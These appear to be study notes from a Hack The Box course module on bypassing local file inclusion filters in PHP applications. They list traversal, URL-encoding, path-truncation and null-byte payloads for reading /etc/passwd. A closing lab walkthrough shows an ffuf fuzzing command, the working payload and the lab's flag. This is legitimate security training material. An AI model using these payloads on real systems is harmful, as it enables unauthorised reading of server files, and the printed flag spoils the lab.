---
tags: [CWES, HTB, technical-reference]
module: "File Inclusion"
source_file: "CWES.xmind"
---

# Basic Bypasses

> [!info] Complete technical reference
> Section imported without removing commands, hints, links, notes, or images.

## One of the most basic filters against LFI

### deletes substrings of (../)

- $language = str_replace('../', '', $_GET['language']);
  - use ....// as our payload
  - as we may use ..././
  - or ....\/
  - or adding extra forward slashes (e.g. ....////)
## Encoding

### bypassed by URL encoding

- Core PHP filters on versions 5.3.4 and earlier were specifically vulnerable to this bypass
- %2e%2e%2f
  - %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
- double encoded
- refer to the Command Injections module for more about bypassing various blacklisted characters
## Approved Paths

### web applications may also use Regular Expressions to ensure that the file being included is under a specific path

- as follows
  - if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {  
    include($_GET['language']);  
    } else {  
    echo 'Illegal path specified!';  
    }
    - only accept paths that are under the ./languages directory
### index.php?language=./languages/../../../../etc/passwd

## Appended Extension

### Path Truncation

- In earlier versions of PHP, defined strings have a maximum length of 4096 characters
  - If a longer string is passed, it will simply be truncated, and any characters after the maximum length will be ignored.
    - ?language=non_existing_directory/../../../etc/passwd/./././././ REPEATED ~2048 times]
      - automate the creation of this string with the following command
        - echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
### Null Bytes

- PHP versions before 5.5 were vulnerable to null byte injection
  - /etc/passwd%00
## LAB

### The above web application employs more than one filter to avoid LFI exploitation. Try to bypass these filters to read /flag.txt

- ffuf -u http://154.57.164.72:30741/index.php?language=languages/FUZZ -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -fs 2306
  - ....//....//....//....//etc/passwd [Status: 200, Size: 3641
    - http://154.57.164.72:30741/index.php?language=languages/....//....//....//....//etc/passwd
      - root:x:..
        - ?language=languages/....//....//....//....//flag.txt
          - HTB{64$!c_f!lt3r$_w0nt_$t0p_lf!}
